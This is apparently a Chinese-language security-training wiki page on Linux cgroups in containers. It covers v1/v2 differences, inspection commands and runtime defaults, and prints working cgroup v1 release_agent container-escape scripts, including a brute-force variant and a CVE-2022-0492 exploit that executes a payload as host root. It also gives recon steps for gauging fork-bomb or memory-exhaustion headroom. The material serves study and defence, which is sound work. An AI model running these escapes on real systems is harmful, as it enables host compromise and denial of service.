# cgroups

{{#include ../../../../banners/hacktricks-training.md}}

## 概述

Linux **控制组**是内核用于将进程组合在一起，以进行记账、限制、优先级管理和策略实施的机制。如果说 namespaces 主要用于隔离资源的视图，那么 cgroups 主要用于管理一组进程可以消耗这些资源的**数量**，并且在某些情况下，还用于管理它们是否能够交互的**资源类别**。Containers 始终依赖 cgroups，即使用户从未直接查看过它们，因为几乎所有现代 runtime 都需要一种方式告诉内核：“这些进程属于这个 workload，并且以下资源规则适用于它们”。

因此，container engines 会将新 container 放入其自身的 cgroup 子树中。进程树进入其中后，runtime 就可以限制内存、限制 PID 数量、调整 CPU 使用权重、调节 I/O，并限制设备访问。在生产环境中，这对于 multi-tenant 安全和基本的运维卫生都至关重要。缺少有效资源控制的 container 可能会耗尽内存、通过创建大量进程淹没系统，或独占 CPU 和 I/O，从而导致 host 或相邻 workload 不稳定。

从安全角度来看，cgroups 有两个不同方面的重要性。首先，错误或缺失的资源限制会导致直接的 denial-of-service attacks。其次，某些 cgroup 功能，尤其是在较旧的 **cgroup v1** 环境中，如果允许从 container 内部写入，历史上曾产生过强大的 breakout primitives。

## v1 与 v2

目前实际使用中有两种主要的 cgroup 模型。**cgroup v1** 暴露多个 controller hierarchies，而较早的 exploit writeups 往往围绕其中可用的、奇怪且有时过于强大的语义展开。**cgroup v2** 引入了更加统一的 hierarchy，并且通常具有更清晰的行为。现代发行版越来越倾向于使用 cgroup v2，但混合环境或 legacy 环境仍然存在，因此在审查真实系统时，两种模型仍然都具有相关性。

这种差异很重要，因为一些最著名的 container breakout 故事，例如对 cgroup v1 中 **`release_agent`** 的滥用，都与较旧的 cgroup 行为有非常具体的关联。看到 blog 上的 cgroup exploit 后，将其盲目应用到仅使用现代 cgroup v2 的系统上的读者，很可能会误解目标实际上能够实现什么。

## 检查

查看当前 shell 所处位置的最快方式是：
```bash
cat /proc/self/cgroup
findmnt -T /sys/fs/cgroup
```
`/proc/self/cgroup` 文件显示与当前进程关联的 cgroup 路径。在现代 cgroup v2 host 上，你通常会看到一个 unified 条目。在较旧或 hybrid host 上，你可能会看到多个 v1 controller 路径。知道路径后，你可以检查 `/sys/fs/cgroup` 下对应的文件，以查看限制和当前使用情况。

在 cgroup v2 host 上，以下命令很有用：
```bash
ls -l /sys/fs/cgroup
cat /sys/fs/cgroup/cgroup.controllers
cat /sys/fs/cgroup/cgroup.subtree_control
```
这些文件会显示哪些 controllers 存在，以及哪些 controllers 已委派给子 cgroup。这个委派模型在 rootless 和 systemd-managed 环境中非常重要，因为 runtime 可能只能控制父层级实际委派的那部分 cgroup 功能。

## 实验

在实践中观察 cgroup 的一种方法是运行一个受内存限制的容器：
```bash
docker run --rm -it --memory=256m debian:stable-slim bash
cat /proc/self/cgroup
cat /sys/fs/cgroup/memory.max 2>/dev/null || cat /sys/fs/cgroup/memory.limit_in_bytes 2>/dev/null
```
你还可以尝试一个受 PID 限制的容器：
```bash
docker run --rm -it --pids-limit=64 debian:stable-slim bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
```
这些示例很有用，因为它们有助于将 runtime flag 与 kernel file interface 联系起来。runtime 并不是靠魔法强制执行规则；它会写入相关的 cgroup settings，然后让 kernel 针对整个 process tree 强制执行这些规则。

## Runtime 使用

Docker、Podman、containerd 和 CRI-O 在正常运行过程中都会依赖 cgroups。它们的差异通常不在于是否使用 cgroups，而在于**选择哪些默认值**、**如何与 systemd 交互**、**rootless delegation 如何工作**，以及**有多少配置由 engine level 控制，而不是由 orchestration level 控制**。

在 Kubernetes 中，resource requests 和 limits 最终会转换为 node 上的 cgroup configuration。从 Pod YAML 到 kernel enforcement 的路径会经过 kubelet、CRI runtime 和 OCI runtime，但 cgroups 仍然是最终应用规则的 kernel mechanism。在 Incus/LXC 环境中，cgroups 也被大量使用，尤其是因为 system containers 通常会暴露更丰富的 process tree，并带来更接近 VM 的 operational expectations。

## Misconfigurations And Breakouts

经典的 cgroup security 故事是可写的 **cgroup v1 `release_agent`** mechanism。在这种模型中，如果 attacker 能够写入正确的 cgroup files、启用 `notify_on_release`，并控制存储在 `release_agent` 中的 path，那么当 cgroup 变为空时，kernel 最终可能会在 host 的 initial namespaces 中执行 attacker 选择的 path。这就是为什么旧的 writeups 如此关注 cgroup controller writability、mount options，以及 namespace/capability conditions。

即使 `release_agent` 不可用，cgroup mistakes 仍然很重要。过于宽泛的 device access 可能使 host devices 能够从 container 中访问。缺少 memory 和 PID limits 可能将简单的 code execution 变成 host DoS。rootless 场景中薄弱的 cgroup delegation 也可能误导 defenders，使其以为某项 restriction 存在，而实际上 runtime 从未真正能够应用它。

### `release_agent` Background

`release_agent` technique 仅适用于 **cgroup v1**。其基本原理是：当 cgroup 中的最后一个 process 退出，并且设置了 `notify_on_release=1` 时，kernel 会执行 path 存储在 `release_agent` 中的 program。该执行发生在 **host 的 initial namespaces 中**，这正是可写的 `release_agent` 能够成为 container escape primitive 的原因。

要使该 technique 生效，attacker 通常需要：

- 一个可写的 **cgroup v1** hierarchy
- 创建或使用 child cgroup 的能力
- 设置 `notify_on_release` 的能力
- 将 path 写入 `release_agent` 的能力
- 一个从 host 视角解析为 executable 的 path

### Classic PoC

历史上的单行 PoC 如下：<sup>[[1]](#references)</sup>
```bash
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p "$d/w"
echo 1 > "$d/w/notify_on_release"
t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
touch /o
echo "$t/c" > "$d/release_agent"
cat <<'EOF' > /c
#!/bin/sh
ps aux > "$t/o"
EOF
chmod +x /c
sh -c "echo 0 > $d/w/cgroup.procs"
sleep 1
cat /o
```
此 PoC 将 payload 路径写入 `release_agent`，触发 cgroup release，然后读取由 host 生成的输出文件。

### 易于阅读的操作步骤

将这一思路拆分为以下步骤后，会更容易理解。<sup>[[1]](#references)</sup>

1. 创建并准备一个可写的 cgroup：
```bash
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp    # or memory if available in v1
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
```
2. 识别与容器文件系统对应的主机路径：
```bash
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
3. 放置一个可从主机路径中看到的 payload：
```bash
cat <<'EOF' > /cmd
#!/bin/sh
ps aux > /output
EOF
chmod +x /cmd
```
4. 通过使 cgroup 为空来触发执行：
```bash
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"
sleep 1
cat /output
```
其效果是以 host root 权限在 host 端执行 payload。在真实 exploit 中，payload 通常会写入 proof file、生成 reverse shell，或修改 host 状态。

### 使用 `/proc/<pid>/root` 的相对路径变体

在某些环境中，container 文件系统在 host 上的路径并不明显，或被 storage driver 隐藏。在这种情况下，可以通过 `/proc/<pid>/root/...` 表示 payload 路径，其中 `<pid>` 是属于当前 container 中某个进程的 host PID。这正是相对路径 brute-force 变体的基础：<sup>[[2]](#references)</sup>
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

sleep 10000 &

cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh
OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}
ps -eaf > \${OUTPATH} 2>&1
__EOF__

chmod a+x ${PAYLOAD_PATH}

mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID}"
exit 1
fi
fi
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

sleep 1
cat ${OUTPUT_PATH}
```
这里的关键技巧不是 brute force 本身，而是路径形式：`/proc/<pid>/root/...` 允许 kernel 从 host namespace 中解析 container filesystem 内的文件，即使事先不知道直接的 host storage 路径。

### CVE-2022-0492 Variant

2022 年，CVE-2022-0492 表明，在 cgroup v1 中向 `release_agent` 写入内容时，并未正确检查 **initial** user namespace 中的 `CAP_SYS_ADMIN`。由于能够 mount cgroup hierarchy 的 container process 无需在 host user namespace 中事先获得特权即可写入 `release_agent`，该技术在存在漏洞的 kernel 上变得更容易实现。<sup>[[3]](#references)</sup>

Minimal exploit：
```bash
apk add --no-cache util-linux
unshare -UrCm sh -c '
mkdir /tmp/c
mount -t cgroup -o memory none /tmp/c
echo 1 > /tmp/c/notify_on_release
echo /proc/self/exe > /tmp/c/release_agent
(sleep 1; echo 0 > /tmp/c/cgroup.procs) &
while true; do sleep 1; done
'
```
在存在漏洞的内核上，主机会以 root 权限执行 `/proc/self/exe`。

在实际利用前，先检查环境是否仍暴露可写的 cgroup-v1 路径或危险的设备访问权限：
```bash
mount | grep cgroup
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null -exec ls -l {} \;
find /sys/fs/cgroup -maxdepth 3 -writable 2>/dev/null | head -n 50
ls -l /dev | head -n 50
```
如果存在且可写入 `release_agent`，你已经进入 legacy-breakout 领域：
```bash
find /sys/fs/cgroup -maxdepth 3 -name notify_on_release 2>/dev/null
find /sys/fs/cgroup -maxdepth 3 -name cgroup.procs 2>/dev/null | head
```
如果 cgroup path 本身无法实现 escape，下一种实际用途通常是 denial of service 或 reconnaissance：
```bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
cat /sys/fs/cgroup/memory.max 2>/dev/null
cat /sys/fs/cgroup/cpu.max 2>/dev/null
```
这些命令可以快速判断该 workload 是否有足够空间执行 fork-bomb、激进地消耗内存，或滥用可写的 legacy cgroup interface。

## Checks

检查目标时，cgroup 检查的目的是了解正在使用哪种 cgroup model、容器是否能看到可写的 controller paths，以及 `release_agent` 等旧版 breakout primitives 是否具有实际意义。
```bash
cat /proc/self/cgroup                                      # Current process cgroup placement
mount | grep cgroup                                        # cgroup v1/v2 mounts and mount options
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null   # Legacy v1 breakout primitive
cat /proc/1/cgroup                                         # Compare with PID 1 / host-side process layout
```
这里值得关注的内容：

- 如果 `mount | grep cgroup` 显示的是 **cgroup v1**，那么较早的 breakout writeup 就更值得参考。
- 如果存在 `release_agent` 且可以访问，那么应立即进行更深入的调查。
- 如果可见的 cgroup 层级结构可写，并且 container 同时具备强大的 capabilities，那么该环境值得更加仔细地审查。

如果发现 **cgroup v1**、可写的 controller 挂载点，并且 container 同时具备强大的 capabilities 或较弱的 seccomp/AppArmor 保护，那么这种组合需要特别谨慎地关注。cgroups 通常被视为一个枯燥的资源管理主题，但从历史上看，它们曾出现在一些最具启发性的 container escape 链中，原因恰恰在于“资源控制”和“对 host 的影响”之间的边界，并不像人们想象的那样始终清晰。

## Runtime 默认设置

| Runtime / platform | 默认状态 | 默认行为 | 常见的手动弱化方式 |
| --- | --- | --- | --- |
| Docker Engine | 默认启用 | Containers 会自动加入 cgroups；除非通过 flags 设置，否则 resource limits 是可选的 | 省略 `--memory`、`--pids-limit`、`--cpus`、`--blkio-weight`；`--device`；`--privileged` |
| Podman | 默认启用 | 默认使用 `--cgroups=enabled`；cgroup namespace 的默认值因 cgroup 版本而异（cgroup v2 使用 `private`，某些 cgroup v1 设置使用 `host`） | `--cgroups=disabled`、`--cgroupns=host`、放宽 device 访问权限、`--privileged` |
| Kubernetes | 默认通过 runtime 启用 | Pods 和 containers 由 node runtime 放入 cgroups；细粒度的 resource control 取决于 `resources.requests` / `resources.limits` | 省略 resource requests/limits、允许 privileged device 访问、host-level runtime 配置错误 |
| containerd / CRI-O | 默认启用 | cgroups 是正常生命周期管理的一部分 | 直接修改 runtime 配置，以放宽 device controls 或暴露传统的可写 cgroup v1 interfaces |

重要区别在于，**cgroup 的存在**通常是默认的，而**有实际作用的 resource constraints**往往是可选的，除非进行显式配置。

## 参考资料

- [1] [Understanding Docker container escapes](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
- [2] [Privileged Container Escape - Control Groups release_agent](http://blog.ajxchapman.com/containers/2020/11/19/privileged-container-escape.html)
- [3] [New Linux Vulnerability CVE-2022-0492 Affecting Cgroups: Can Containers Escape?](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)

{{#include ../../../../banners/hacktricks-training.md}}
